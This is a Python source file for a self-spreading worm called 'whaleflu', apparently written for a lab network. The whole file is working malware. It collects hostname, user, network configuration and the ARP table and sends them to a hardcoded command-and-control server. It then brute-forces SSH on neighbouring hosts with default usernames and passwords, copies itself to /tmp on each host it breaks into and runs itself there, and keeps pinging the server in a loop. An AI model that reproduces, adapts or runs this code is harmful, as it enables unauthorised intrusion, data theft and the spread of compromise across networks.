#!/usr/bin/python3
import json
import re
import subprocess
import socket
import time

C2C_HOST = "192.168.0.1"
C2C_PORT = 4000

C2C_COMMUNICATION_INTERVAL_S = 10

host_info = {
    "hostname": "",
    "whoami": "",
    "ifconfig": "",
    "arp": "",
    "ssh_found": False
}

# List of usernames used to bruteforce ssh connections
ssh_usernames = [
    "admin",
    "administrator",
    "root"
]

# List of passwords used to bruteforce ssh connections
ssh_passwords = [
    "admin",
    "administrator",
    "root"
]

def bruteforce_malware_to_other_instances() -> None:
    """
    Installs paramiko via pip on the machine. Attempts to bruteforce access to
    other instances in the network via ssh. If valid credentials are found,
    copies the whaleflu.py to /tmp on the instance and executes it.
    """
    subprocess.run(
        ["pip3", "install", "paramiko"],
        capture_output=True,
        text=True
    ).stdout.strip()

    import paramiko

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for ip in host_info["arp"]:
        if ip == C2C_HOST:
            continue
        for username in ssh_usernames:
            for password in ssh_passwords:
                try:
                    ssh_client.connect(ip,
                                    port=22,
                                    username=username,
                                    password=password)
                    print(f"{host_info['hostname']}: Credentials found: {username}:{password} for {ip}")

                    # If the machine is already infected, don't do anything
                    stdin, stdout, stderr = ssh_client.exec_command("ls /tmp")
                    if "whaleflu" in stdout.read().decode():
                        continue

                    # Create an SFTP client from the SSH connection for copying
                    # files
                    sftp_client = ssh_client.open_sftp()

                    # Upload malware to /tmp on the remote machine
                    pwd = subprocess.run(
                        ["pwd"],
                        capture_output=True,
                        text=True
                    ).stdout.strip()
                    sftp_client.put(f"{pwd}whaleflu.py", "/tmp/whaleflu.py")

                    # Run the malware on the other instance
                    stdin, stdout, stderr = ssh_client.exec_command("python3 /tmp/whaleflu.py")

                    sftp_client.close()
                    ssh_client.close()
                    continue
                except paramiko.AuthenticationException:
                    print(f"{host_info['hostname']}: Authentication failed: {username}:{password}.")
                except paramiko.SSHException as ssh_exception:
                    print(f"SSH connection failed: {ssh_exception}")
                except FileNotFoundError as fnf_error:
                    print(f"File not found: {fnf_error}")


def get_host_info() -> None:
    """
    Populates the host_info dictionary with the hostname,
    current user (whoami), network configuration (ifconfig),
    and ARP table (arp -a). Handles potential FileNotFoundError for ARP.
    """
    host_info["hostname"] = subprocess.run(
        ["hostname"],
        capture_output=True,
        text=True
    ).stdout.strip()

    host_info["whoami"] = subprocess.run(
        ["whoami"],
        capture_output=True,
        text=True
    ).stdout.strip()

    host_info["ifconfig"] = subprocess.run(
        ["ifconfig"],
        capture_output=True,
        text=True
    ).stdout.strip()

    try:
        host_info["arp"] = subprocess.run(
            ["arp", "-a"],
            capture_output=True,
            text=True
        ).stdout.strip()
        ip_pattern = re.compile(r'\((\d+\.\d+\.\d+\.\d+)\)')
        host_info["arp"] = ip_pattern.findall(host_info["arp"])
    except FileNotFoundError:
        host_info["arp"] = ""

    host_info["ssh_found"] = bool(subprocess.run(
        ["apt", "-qq", "list", "ssh"],
            capture_output=True,
            text=True
        ).stdout.strip())


def ping_c2c() -> None:
    """
    Sends a ping message to the C2C server with the hostname.
    The message format is "hostname ping".
    """
    message = host_info["hostname"] + " ping"
    send_message_to_c2c(message.encode("utf-8"))


def send_message_to_c2c(message: bytes) -> None:
    """
    Sends a message to the C2C server.
    Tries to connect to the server and send the message.
    Handles ConnectionRefusedError gracefully.
    """
    try:
        s = socket.socket()
        s.connect((C2C_HOST, C2C_PORT))
        s.send(message)
    except ConnectionRefusedError:
        # Consider removing these prints to make the malware less noisy
        print("Connection refused, will retry later.")
    except socket.error as e:
        print(f"Socket error: {e}")
    finally:
        s.close()


def main() -> None:
    """
    Main function that collects host information and sends it to the C2C
    server. Continuously sends ping messages to the C2C server at regular
    intervals.
    """
    get_host_info()
    send_message_to_c2c(json.dumps(host_info).encode("utf-8"))

    # Attempt to spread to other networks (excluding the C2C host in our setup)
    bruteforce_malware_to_other_instances()

    # Ping the c2c server indefinitely
    while True:
        ping_c2c()
        time.sleep(C2C_COMMUNICATION_INTERVAL_S)


if __name__ == "__main__":
    main()
